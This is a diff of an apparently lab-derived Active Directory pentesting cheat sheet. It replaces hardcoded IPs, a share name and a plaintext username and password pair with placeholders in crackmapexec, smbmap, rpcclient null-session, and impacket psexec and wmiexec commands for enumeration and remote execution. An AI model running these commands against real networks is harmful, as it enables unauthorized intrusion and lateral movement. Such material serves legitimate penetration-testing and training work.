@@ -23,7 +23,7 @@ sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --groups
 ```
 
 ```bash
-sudo crackmapexec smb 172.16.5.130 -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
+sudo crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
 ```
 
 ```bash
@@ -31,7 +31,7 @@ sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
 ```
 
 ```bash
-sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share 'Department Shares'
+sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share '{{SHARE_NAME}}'
 ```
 
 ```bash
@@ -43,7 +43,7 @@ smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}}
 ```
 
 ```bash
-smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R 'Department Shares' --dir-only
+smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R '{{SHARE_NAME}}' --dir-only
 ```
 
 ```bash
@@ -51,11 +51,11 @@ rpcclient -U "" -N {{DC_IP}}
 ```
 
 ```bash
-impacket-psexec {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
+impacket-psexec {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}
 ```
 
 ```bash
-impacket-wmiexec {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
+impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{DC_IP}}
 ```
 
 ```bash
